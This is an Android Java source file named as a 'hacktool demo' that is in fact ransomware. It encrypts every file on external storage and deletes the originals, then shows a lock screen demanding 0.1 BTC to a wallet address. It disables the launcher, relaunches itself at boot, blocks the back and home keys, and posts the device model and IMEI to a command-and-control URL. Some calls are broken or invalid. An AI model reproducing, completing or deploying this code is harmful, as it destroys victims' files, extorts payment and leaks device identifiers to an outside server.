package com.hacktool.demo;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.io.File;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import android.content.pm.PackageManager;
import android.content.ComponentName;

public class MainActivity extends Activity {
    private static final String PREFS = "ransom_prefs";
    private static final String PREF_ENC = "encrypted";
    private static final String PREF_KEY = "key";
    private static final String WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
    private SecretKey encKey;
    private boolean encrypted = false;
    private String c2Url = "https://yourusername.github.io/panel450/report.php";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // FULLSYSTEM LOCK
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN |
                           WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                           WindowManager.LayoutParams.FLAG_FULLSCREEN |
                           WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        
        loadPrefs();
        
        if (!encrypted) {
            encryptEverything();
            savePrefs();
            reportToC2();
        }
        
        showLockScreen();
        disableAllApps();
        registerBootReceiver();
    }
    
    private void loadPrefs() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        encrypted = prefs.getBoolean(PREF_ENC, false);
        String keyStr = prefs.getString(PREF_KEY, null);
        if (keyStr != null) encKey = new SecretKeySpec(keyStr.getBytes(), "AES");
    }
    
    private void savePrefs() {
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        prefs.edit().putBoolean(PREF_ENC, true)
              .putString(PREF_KEY, new String(encKey.getEncoded()))
              .apply();
    }
    
    private void encryptEverything() {
        try {
            if (encKey == null) {
                KeyGenerator kg = KeyGenerator.getInstance("AES");
                kg.init(256, new SecureRandom());
                encKey = kg.generateKey();
            }
            
            File[] roots = {Environment.getExternalStorageDirectory()};
            for (File root : roots) {
                encryptDir(root, encKey);
            }
        } catch (Exception ignored) {}
    }
    
    private void encryptDir(File dir, SecretKey key) {
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                if (f.isFile() && !f.getName().endsWith(".locked")) {
                    try {
                        Cipher c = Cipher.getInstance("AES");
                        c.init(Cipher.ENCRYPT_MODE, key);
                        byte[] data = java.nio.file.Files.readAllBytes(f.toPath());
                        byte[] enc = c.doFinal(data);
                        File locked = new File(f.getPath() + ".locked");
                        java.nio.file.Files.write(locked.toPath(), enc);
                        f.delete();
                    } catch (Exception ignored) {}
                } else if (f.isDirectory()) {
                    encryptDir(f, key);
                }
            }
        }
    }
    
    private void showLockScreen() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#FF0000"));
        layout.setPadding(30, 30, 30, 30);
        
        TextView title = new TextView(this);
        title.setText("🔒 FILES LOCKED! 🔒");
        title.setTextSize(32);
        title.setTypeface(null, Typeface.BOLD);
        title.setTextColor(Color.WHITE);
        title.setGravity(17);
        
        TextView msg = new TextView(this);
        msg.setText("सबै फाइल encrypted!\nPay 0.1 BTC:\n" + WALLET);
        msg.setTextSize(20);
        msg.setTextColor(Color.WHITE);
        msg.setPadding(0, 40, 0, 40);
        msg.setGravity(17);
        
        Button pay = new Button(this);
        pay.setText("💰 PAY BITCOIN");
        pay.setTextSize(22);
        pay.setOnClickListener(v -> startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("bitcoin:" + WALLET))));
        
        layout.addView(title);
        layout.addView(msg);
        layout.addView(pay);
        
        setContentView(layout);
    }
    
    private void disableAllApps() {
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(new ComponentName("com.android.launcher3", "*"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
    
    private void registerBootReceiver() {
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context c, Intent i) {
                if (Intent.ACTION_BOOT_COMPLETED.equals(i.getAction())) {
                    c.startActivity(new Intent(c, MainActivity.class)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                }
            }
        }, new IntentFilter(Intent.ACTION_BOOT_COMPLETED));
    }
    
    private void reportToC2() {
        new Thread(() -> {
            try {
                URL url = new URL(c2Url);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                String post = "device=" + android.os.Build.MODEL + 
                            "&files=encrypted&status=locked&imei=" + android.telephony.TelephonyManager.getDeviceId();
                OutputStream os = conn.getOutputStream();
                os.write(post.getBytes());
                os.close();
            } catch (Exception ignored) {}
        }).start();
    }
    
    // BLOCK EVERYTHING
    @Override public boolean onKeyDown(int key, KeyEvent e) {
        if (key == KeyEvent.KEYCODE_BACK || key == KeyEvent.KEYCODE_HOME) {
            Toast.makeText(this, "💰 Pay to Unlock!", 1).show();
            return true;
        }
        return super.onKeyDown(key, e);
    }
}